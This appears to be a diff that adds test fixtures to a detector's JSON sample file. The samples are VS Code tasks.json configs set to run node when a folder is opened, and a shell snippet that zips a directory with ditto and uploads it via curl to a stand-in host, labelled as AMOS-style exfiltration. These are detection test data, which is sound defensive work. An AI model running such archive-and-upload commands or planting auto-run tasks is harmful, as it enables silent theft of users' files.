@@ -242,5 +242,20 @@
     "name": "tasks_folderopen_watch.json",
     "text": "{\"version\":\"2.0.0\",\"tasks\":[{\"label\":\"watch\",\"type\":\"npm\",\"script\":\"watch\",\n\"presentation\":{\"reveal\":\"silent\"},\"runOptions\":{\"runOn\":\"folderOpen\"}}]}\n",
     "expected": null
+  },
+  {
+    "name": "tasks_folderopen_pretty_args.json",
+    "text": "{\n  \"version\": \"2.0.0\",\n  \"tasks\": [\n    {\n      \"label\": \"init\",\n      \"type\": \"process\",\n      \"command\": \"node\",\n      \"args\": [\n        \"-e\",\n        \"process.exit(0)\"\n      ],\n      \"runOptions\": {\n        \"runOn\": \"folderOpen\"\n      }\n    }\n  ]\n}\n",
+    "expected": "dev_vscode_autorun_task"
+  },
+  {
+    "name": "tasks_folderopen_pretty_script.json",
+    "text": "{\n  \"version\": \"2.0.0\",\n  \"tasks\": [\n    {\n      \"label\": \"init\",\n      \"type\": \"process\",\n      \"command\": \"node\",\n      \"args\": [\n        \"build.js\",\n        \"process.exit(0)\"\n      ],\n      \"runOptions\": {\n        \"runOn\": \"folderOpen\"\n      }\n    }\n  ]\n}\n",
+    "expected": null
+  },
+  {
+    "name": "amos_exfil_relative.sh",
+    "text": "ditto -c -k --keepParent \"$D\" out.zip\ncurl --data-binary @out.zip https://example.invalid/u\n",
+    "expected": "macos_archive_upload"
   }
 ]
